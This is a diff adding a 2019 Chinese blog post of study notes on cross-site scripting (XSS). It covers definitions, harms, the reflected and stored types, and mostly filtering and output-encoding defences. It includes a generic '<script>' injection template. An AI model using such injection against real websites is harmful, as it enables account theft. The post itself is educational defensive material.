+    <article id="post-9.26" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/9.26/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.476Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/9.26/">9.26学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>XSS跨站脚本攻击</p>
+<h2 id="XSS跨站脚本攻击："><a href="#XSS跨站脚本攻击：" class="headerlink" title="XSS跨站脚本攻击："></a>XSS跨站脚本攻击：</h2><p>跨站脚本攻击（Cross Site Scripting）缩写为CSS，因容易与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。<br><by><br>跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。指恶意攻击者利用网站没有对用户提交的数据进行转义处理或过滤不足的缺点，进而添加一些代码，嵌入到web页面中，使别的用户访问都会执行相应的代码。从而盗取用户资料、利用用户身份进行某种动作或对访问者进行病毒侵害的一种攻击方式。<br><by><br>当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞，XSS一般使用javascript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。<br><by><br>危害：<br>盗取各类用户站号、控制企业数据，包括读取、篡改、添加、删除数据的能力。盗取资料、非法转载帐、强制发送电子邮件、网站挂马、控制受害者机器发起攻击<br><by></p>
+<h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><p>反射型XSS：<br>只在提交的一刻代码会执行一遍，不会保存。但可以存储在url中，当用户点击时就会生效（如搜索框）。<br><by><br>存储型XSS：<br>可以把代码保存在网页上，当用户访问时就会生效（如留言框），相对反射型危害较大。<br><by><br>Javascript格式：<br>“&lt;\script&gt; 内容 &lt;/script&gt;” //在内容中加入js代码就可以进行攻击</p>
+<h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>入参字符过滤<br>在源头控制，把输入的一些不合法的东西都过滤掉，从而保证安全性。如移除用户提交的的DOM属性如onerror，移除用户上传的Style节点，&lt;\iframe&gt;,&lt;\script&gt;，&lt;\a&gt;节点等出参进行编码.<br>如果源头没控制好，就得后期补救了：像一些常见的符号，如&lt;&gt;在输出的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。例如：对&lt;&gt;做编码如：”&lt;”用:”&lt;”,”&gt;”用:”&gt;”来代替。<br>入参长度限制<br><by><br>资料链接：<br><a href="https://www.bilibili.com/video/av46483006" target="_blank" rel="noopener">bilibili</a><br>[博客园（网络攻击-XSS攻击详解）]（<a href="https://www.cnblogs.com/mao2080/p/9460397.html）" target="_blank" rel="noopener">https://www.cnblogs.com/mao2080/p/9460397.html）</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/9.26/" data-id="ck1z2w7ql0008kkvkhwtrec82" class="article-share-link">Share</a>
       
       
     </footer>
@@ -141,7 +496,23 @@
       <ul>
         
           <li>
-            <a href="/2019/10/20/hello-world/">Hello World</a>
+            <a href="/2019/10/20/10.17/">学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/10.9/">学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/10.2/">近期学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/10.4/">近期学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/9.27/">9.27学习笔记</a>
           </li>
         
       </ul>
